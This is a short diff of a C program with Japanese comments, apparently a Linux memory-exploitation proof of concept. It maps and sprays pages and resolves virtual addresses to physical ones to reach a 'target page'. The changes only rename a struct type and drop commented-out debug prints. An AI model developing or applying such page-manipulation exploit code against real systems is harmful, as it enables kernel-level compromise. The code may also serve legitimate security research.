@@ -104,7 +104,7 @@ int main() {
     *(uint8_t *)new_map_2 = 'A';
     *(uint8_t *)new_map_3 = 'A';
 
-    dummy target_page;
+    address target_page;
     target_page.virt_addr = new_map_3;
     target_page.phys_addr = v2p(0, new_map_3);
 
@@ -120,7 +120,7 @@ int main() {
     if (munmap(pbuf_map, 0x1000) == -1) perror("[-] munmap() failed");
 
     // ダミーページ確保
-    dummy dummy_pages[DUMMY_PAGE];
+    address dummy_pages[DUMMY_PAGE];
     for (int i = 0; i < DUMMY_PAGE; i++) {
         dummy_pages[i].virt_addr = custom_mmap();
         if (dummy_pages[i].virt_addr == MAP_FAILED) continue;
@@ -187,12 +187,6 @@ int main() {
         printf("[-] failed lead to the target page\n");
         if (munmap(new_map_2, 0x1000) == -1) perror("munmap() failed");
     }
-
-    // printf("[+] should be 'a' but '%c'\n", *(char *)addr_2);
-    // printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb30));
-    // printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb38));
-    // printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb40));
-    // printf("[+] %lx\n", *(unsigned long *)((char *)addr_2 + 0xb48));
 
     // メモリの解放関連
     if (munmap(new_map_1, 0x1000) == -1) perror("munmap() failed");
